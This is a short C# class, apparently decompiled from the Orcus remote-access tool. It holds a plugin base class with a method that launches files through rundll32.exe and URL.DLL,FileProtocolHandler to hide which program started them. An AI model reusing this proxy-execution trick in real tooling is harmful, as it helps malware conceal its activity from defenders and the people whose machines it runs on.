using System;
using System.Diagnostics;
using System.IO;
using Orcus.Plugins;
using Orcus.Service;

namespace Orcus.CommandManagement;

internal class ToolBase : IToolBase
{
	public IServicePipe ServicePipe { get; }

	public ToolBase()
	{
		if (ServiceConnection.Current.IsConnected)
		{
			ServicePipe = ServiceConnection.Current.Pipe;
		}
	}

	public void ExecuteFileAnonymously(string path)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "rundll32.exe");
		if (!File.Exists(text))
		{
			Process.Start(path);
		}
		else
		{
			Process.Start(text, $"URL.DLL,FileProtocolHandler \"{path}\"");
		}
	}
}
